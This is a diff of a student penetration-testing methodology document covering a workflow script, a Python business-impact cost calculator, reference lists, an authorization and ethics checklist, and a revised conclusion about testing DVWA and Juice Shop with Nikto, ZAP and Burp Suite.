+# Make all scripts executable
+chmod +x *.sh *.py
+
+# Run complete workflow
+./complete_website_integration.sh
+
+# Copy results to website directory (adjust path as needed)
+# cp -r scan-results/ /path/to/your/website/
+# cp assets/js/scan-status.js /path/to/your/website/assets/js/
+
+echo "🎉 All phases complete! Website ready with all reports."
+```
+
+---
+
+## 📈 Business Impact Assessment Framework
+
+### Financial Impact Calculator
+```python
+#!/usr/bin/env python3
+# File: business_impact_calculator.py
+
+class BusinessImpactCalculator:
+    def __init__(self, company_profile):
+        self.company_profile = company_profile
+        
+    def calculate_data_breach_cost(self, records_affected, data_sensitivity):
+        """Calculate data breach costs using IBM Security model"""
+        
+        base_cost_per_record = {
+            'high': 180,    # Healthcare, financial
+            'medium': 150,  # Personal data
+            'low': 120      # Public information
+        }
+        
+        cost_per_record = base_cost_per_record.get(data_sensitivity, 150)
+        direct_cost = records_affected * cost_per_record
+        
+        # Industry multipliers
+        industry_multipliers = {
+            'healthcare': 1.4,
+            'financial': 1.3,
+            'retail': 1.1,
+            'technology': 1.0,
+            'government': 1.2
+        }
+        
+        multiplier = industry_multipliers.get(self.company_profile.get('industry'), 1.0)
+        total_cost = direct_cost * multiplier
+        
+        return {
+            'direct_cost': direct_cost,
+            'industry_adjusted_cost': total_cost,
+            'cost_per_record': cost_per_record,
+            'records_affected': records_affected
+        }
+    
+    def calculate_regulatory_fines(self, data_breach_cost, regulations):
+        """Calculate potential regulatory fines"""
+        
+        fines = {}
+        
+        if 'GDPR' in regulations:
+            # GDPR: Up to €20M or 4% of annual turnover
+            annual_turnover = self.company_profile.get('annual_revenue', 100000000)
+            gdpr_fine = min(20000000, annual_turnover * 0.04)
+            fines['GDPR'] = gdpr_fine
+        
+        if 'HIPAA' in regulations:
+            # HIPAA: $100-$50,000 per violation, max $1.5M annually
+            records = data_breach_cost['records_affected']
+            hipaa_fine = min(1500000, records * 1000)
+            fines['HIPAA'] = hipaa_fine
+        
+        if 'PCI_DSS' in regulations:
+            # PCI DSS: $5,000-$100,000 per month
+            pci_fine = 50000 * 6  # 6 months average
+            fines['PCI_DSS'] = pci_fine
+        
+        return fines
+    
+    def calculate_business_disruption(self, downtime_hours, revenue_per_hour):
+        """Calculate business disruption costs"""
+        
+        direct_revenue_loss = downtime_hours * revenue_per_hour
+        
+        # Additional disruption costs
+        employee_productivity_loss = direct_revenue_loss * 0.3
+        customer_service_costs = direct_revenue_loss * 0.2
+        recovery_costs = direct_revenue_loss * 0.4
+        
+        total_disruption = (direct_revenue_loss + 
+                           employee_productivity_loss + 
+                           customer_service_costs + 
+                           recovery_costs)
+        
+        return {
+            'direct_revenue_loss': direct_revenue_loss,
+            'productivity_loss': employee_productivity_loss,
+            'customer_service_costs': customer_service_costs,
+            'recovery_costs': recovery_costs,
+            'total_disruption': total_disruption
+        }
+
+# Example usage
+company = {
+    'industry': 'retail',
+    'annual_revenue': 50000000,  # $50M
+    'employees': 500,
+    'customers': 100000
+}
+
+calculator = BusinessImpactCalculator(company)
+
+# Calculate impact for SQL injection breach
+breach_cost = calculator.calculate_data_breach_cost(
+    records_affected=100000,
+    data_sensitivity='medium'
+)
+
+regulatory_fines = calculator.calculate_regulatory_fines(
+    breach_cost,
+    ['GDPR', 'PCI_DSS']
+)
+
+disruption_cost = calculator.calculate_business_disruption(
+    downtime_hours=24,
+    revenue_per_hour=2850  # $50M / (365*24)
+)
+
+print("💰 Business Impact Assessment")
+print("============================")
+print(f"Data Breach Cost: ${breach_cost['industry_adjusted_cost']:,.2f}")
+print(f"Regulatory Fines: ${sum(regulatory_fines.values()):,.2f}")
+print(f"Business Disruption: ${disruption_cost['total_disruption']:,.2f}")
+print(f"Total Impact: ${breach_cost['industry_adjusted_cost'] + sum(regulatory_fines.values()) + disruption_cost['total_disruption']:,.2f}")
+```
+
+---
+---
+
+## 📚 Additional Resources and References
+
+### Professional Development
+- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
+- [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)
+- [NIST SP 800-115: Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)
+
+### Tool Documentation
+- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
 - [OWASP ZAP User Guide](https://www.zaproxy.org/docs/)
-- [Nikto Web Scanner Documentation](https://cirt.net/Nikto2)
+- [Nikto Scanner Documentation](https://cirt.net/nikto2-docs/)
 
-## Compliance and Standards
-- [NIST Cybersecurity Framework 2.0](https://www.nist.gov/cyberframework) (NIST, 2024)
-- [ISO/IEC 27001:2022 Information Security Management](https://www.iso.org/standard/27001)
-- [PCI Data Security Standard v4.0](https://www.pcisecuritystandards.org/) (PCI Security Standards Council, 2022)
+### Compliance Frameworks
+- [PCI DSS v4.0 Requirements](https://www.pcisecuritystandards.org/document_library/)
+- [GDPR Article 83 Fines](https://gdpr-info.eu/art-83-gdpr/)
+- [ISO 27001:2022 Controls](https://www.iso.org/standard/27001)
+
+---
 
 ## ⚠️ Legal and Ethical Considerations
 
 ### Testing Authorization Requirements
-- **Written Permission**: Obtain explicit written authorization before testing
+- **Written Permission**: Always obtain explicit written authorization before testing
 - **Scope Definition**: Clearly define testing boundaries and limitations
-- **Data Handling**: Establish protocols for handling discovered sensitive data
+- **Data Handling**: Establish protocols for discovered sensitive data
 - **Reporting Timeline**: Agree on vulnerability disclosure timelines
 
 ### Professional Ethics Framework
@@ -2186,76 +1801,61 @@ echo "Risk assessment completed. Check $OUTPUT_DIR for results."
 - [ ] Insurance coverage verified
 - [ ] Compliance requirements identified
 
-## 🏆 Project Conclusion
+---
 
-This penetration testing project demonstrates the critical importance of web application security in protecting business assets and customer trust. Through systematic testing of common vulnerabilities using industry-standard tools on Kali Linux, we've quantified how attackers can exploit weaknesses to achieve significant business impact.
+## 🔬 Professional Insights and Research Implications
 
-### Key Research Findings
+This three-phase penetration testing methodology provides a systematic approach to web application security assessment using Kali Linux tools. The framework delivers:
 
-```
-Research Outcomes and Business Impact
-┌─────────────────────────────────────────────────────────────┐
-│  SQL Injection (19% prevalence) ──► Database Compromise     │
-│  XSS (23% prevalence) ──────────────► Session Hijacking     │  
-│  Broken Auth (14% prevalence) ─────► Account Takeover       │
-│                                                             │
-│                All Lead To                                  │
-│                     ▼                                       │
-│            Average Cost: $4.88M                             │
-└─────────────────────────────────────────────────────────────┘
-```
+**Technical Value:**
+- Comprehensive vulnerability discovery through automated and manual testing
+- Verified proof-of-concept exploits demonstrating real attack scenarios
+- Detailed technical evidence supporting remediation efforts
 
-### Project Impact Summary
-The combination of DVWA and OWASP Juice Shop provides comprehensive coverage of both traditional and modern web application security challenges, preparing security professionals to protect against real-world threats that cost organizations an average of $4.88 million per incident.
+**Business Value:**
+- Quantified financial impact enabling informed security investment decisions
+- Risk-based prioritization supporting resource allocation
+- Compliance evidence supporting regulatory requirements
 
-**Evidence-Based Conclusions:**
-1. Web applications remain the primary attack vector, with 75% of attacks occurring at the application layer
-2. Simple vulnerabilities can lead to catastrophic business impact, with average breach costs exceeding $4.88 million
-3. Regular security testing is essential, as 43% of cyberattacks target small businesses
-4. Proper remediation requires both technical fixes and process improvements to address the 26% of data breaches involving web applications
+**Operational Value:**
+- Repeatable methodology ensuring consistent assessment quality
+- Scalable framework supporting multiple target environments
+- Integrated reporting providing technical and executive perspectives
 
-By understanding these vulnerabilities and their quantified business impact, organizations can make informed, data-driven decisions about security investments and prioritize remediation efforts to protect their most valuable assets.
+The combination of reconnaissance (Nikto), validation (OWASP ZAP), and exploitation (Burp Suite) provides complete coverage of the web application attack surface, ensuring organizations can identify, validate, and quantify security risks to protect their most valuable assets.
 
 ---
 
 ## 📖 References
 
-Acunetix. (2024). *Web application vulnerability report 2024*. Acunetix Ltd.
+Damn Vulnerable Web Application (DVWA). (2024). *Security testing platform*. https://github.com/digininja/DVWA
 
-CIRT. (2024). *Nikto web scanner database statistics*. Computer Incident Response Team.
+IBM Security. (2024). *Cost of a data breach report 2024*. https://www.ibm.com/reports/data-breach
 
-Cybersecurity Ventures. (2024). *Global cybercrime costs*. Cybersecurity Ventures Research.
+NIST. (2024). *SP 800-115: Technical guide to information security testing and assessment*. https://csrc.nist.gov/publications/detail/sp/800-115/final
 
-European Commission. (2018). *General Data Protection Regulation (GDPR)*. Official Journal of the European Union.
+Nikto. (2024). *Nikto web server scanner*. https://cirt.net/Nikto2
 
-Gartner. (2024). *The cost of IT downtime: Survey results*. Gartner Research.
+OWASP. (2021). *OWASP top 10 - 2021: The ten most critical web application security risks*. https://owasp.org/www-project-top-ten/
 
-GitHub. (2024). *OWASP ZAP repository statistics*. https://github.com/zaproxy/zaproxy
+OWASP Juice Shop. (2024). *Probably the most modern and sophisticated insecure web application*. https://owasp.org/www-project-juice-shop/
 
-HHS. (2024). *HIPAA enforcement results*. U.S. Department of Health and Human Services.
+OWASP ZAP. (2024). *Zed attack proxy*. https://www.zaproxy.org/
 
-IBM Security. (2024). *Cost of a data breach report 2024*. IBM Corporation.
+PortSwigger. (2024). *Burp suite professional documentation*. https://portswigger.net/burp/documentation
 
-NIST. (2024). *Cybersecurity Framework 2.0*. National Institute of Standards and Technology.
+Verizon. (2024). *2024 data breach investigations report*. https://www.verizon.com/business/resources/reports/dbir/
 
-OWASP. (2021). *OWASP Top 10 - 2021: The ten most critical web application security risks*. Open Web Application Security Project.
+---
 
-OWASP. (2024). *Web application security statistics*. Open Web Application Security Project.
+## 📄 Copyright and Attribution
 
-PCI Security Standards Council. (2022). *Payment Card Industry Data Security Standard v4.0*. PCI Security Standards Council.
+**Author:** Jose Antonio Escalante Lopez ([![GitHub](https://img.shields.io/badge/GitHub-@JaelDS-181717?logo=github)](https://github.com/JaelDS))  
+**Repository:** https://github.com/JaelDS/Cybersec-Web-App-Incident-Response  
+**Institution:** Torrens University Australia, Brisbane  
 
-PCI Security Standards Council. (2024). *PCI DSS compliance guide and penalty structure*. PCI Security Standards Council.
+Copyright (c) 2024 Jose Antonio Escalante Lopez.
 
-PortSwigger. (2024). *State of web application security testing*. PortSwigger Web Security.
+---
 
-SEC. (2002). *Sarbanes-Oxley Act of 2002*. U.S. Securities and Exchange Commission.
-
-Shopify. (2024). *Global e-commerce statistics report*. Shopify Inc.
-
-Statista. (2024). *Number of internet users worldwide*. Statista GmbH.
-
-Veracode. (2024). *State of software security report*. Veracode Inc.
-
-Verizon. (2024). *2024 Data Breach Investigations Report*. Verizon Enterprise Solutions.
-
-WhiteHat Security. (2023). *Application security statistics report*. WhiteHat Security Inc.
+*This penetration testing methodology is designed for educational and authorized security testing purposes only. Users are responsible for obtaining proper authorization and complying with applicable laws and regulations.*
